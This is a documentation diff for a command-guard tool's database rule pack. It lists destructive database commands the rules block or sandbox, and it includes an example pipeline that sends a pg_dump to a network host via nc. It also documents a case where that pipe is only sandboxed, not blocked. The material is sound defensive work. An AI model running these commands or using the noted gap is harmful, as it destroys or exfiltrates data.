@@ -507,7 +507,36 @@ as an **opt-in rule pack**: a curated rule file in the repository under
 
 | Pack | Blocks | Sandboxes | Rules |
 |------|--------|-----------|------:|
-| `db` | `DROP DATABASE` (`pack-db-drop-database`), `DROP TABLE` (`pack-db-drop-table`) — blocked only in a SQL-execution context (a SQL client + the statement after its `-c`/`-e` flag, in a multi-statement flag string, or positionally after sqlite3/sqlplus; not bare statement text) | bulk dump/restore tooling — `pg_dump`, `pg_dumpall`, `pg_restore`, `mysqldump`, `mysqlimport` (`pack-db-dump-restore`) | 3 |
+| `db` | Whole-store destruction (priority 950): `DROP DATABASE`/`DROP SCHEMA` (`pack-db-drop-database`), `TRUNCATE ... CASCADE` (`pack-db-truncate-cascade`), the psql `\!` meta-shell escape (`pack-db-psql-meta-shell`), `mysqladmin`/`mariadb-admin shutdown` (`pack-db-admin-shutdown`), `redis-cli CONFIG SET dir\|dbfilename` / `CONFIG REWRITE` (`pack-db-redis-config`), `MODULE LOAD` (`pack-db-redis-module`), `FLUSHALL`/`FLUSHDB` (`pack-db-redis-flush`), mongosh/mongo `dropDatabase()` (`pack-db-mongosh-drop`) and shutdown (`pack-db-mongosh-shutdown`), a delete of a live `/var/lib` data tree or a `*.duckdb` file (`pack-db-data-dir-delete`), and a dump piped to a network sink (`pack-db-dump-exfil`) | Gray-zone shapes (priority 650, namespace wrap — the command still runs): a single-table `DROP TABLE` (`pack-db-drop-table`), a bare `TRUNCATE` (`pack-db-truncate`), bulk dump/restore tooling — `pg_dump`, `pg_dumpall`, `pg_restore`, `mysqldump`, `mysqlimport` (`pack-db-dump-restore`) | 14 |
+
+The SQL rules (`pack-db-drop-database`, `pack-db-truncate-cascade`,
+`pack-db-drop-table`, `pack-db-truncate`) match **execution context only**: a SQL
+client (psql, mysql, mariadb, sqlite3, mysqladmin, sqlplus) at command position
+AND the statement after its `-c`/`-e`/`--command`/`--execute` flag, in a
+multi-statement flag string, or positionally after sqlite3/sqlplus. Bare
+statement text — a `sed` replacement, a commit message, a grep argument, a quoted
+data literal, an `echo` redirect — is **not** matched, so the commands that
+*record* or *remove* a destructive statement keep running (DF-TERMINAL-JAIL-23).
+The remaining rules are anchored on their client token at command position for
+the same reason.
+
+Every rule is proved against the live engine by [`plugin/test_rule_pack_db.py`](plugin/test_rule_pack_db.py):
+one vector per rule id, the false-positive contexts above, the legit pins
+(`psql -c 'SELECT …'`, `psql -f migration.sql`, `sqlite3 db 'INSERT …'`, alembic /
+`python -c` ORM use, a dump to a local file, `redis-cli GET`/`SET`,
+`mysqladmin status`) and the gray shapes' `modify` verdict.
+
+Two boundaries that test file states plainly rather than hiding:
+
+- `pack-db-dump-exfil` matches the form the **wrapper** produces. The wrapper
+  single-quotes every argv token, so `pg_dump db | nc host 4444` reaches the
+  engine as ONE segment and blocks. Called through the Python API with a BARE
+  pipe, the parser splits the command at the operator and a pack rule (per
+  segment) sees only the dump stage: the vector is then `modify` /
+  `pack-db-dump-restore` — sandboxed, still running — not `block`. That residual
+  is pinned by a test so it cannot drift silently.
+- The `pipeline` match type listed in §Match Types is unreachable — the parser
+  only ever emits simple segments — so the pack uses `pattern` throughout.
 
 A pack is byte-copied to `<rules dir>/terminal-jail-pack-<name>.yaml` — the SAME
 rules directory the default rules file resolves to (`TERMINAL_JAIL_RULES_DIR`
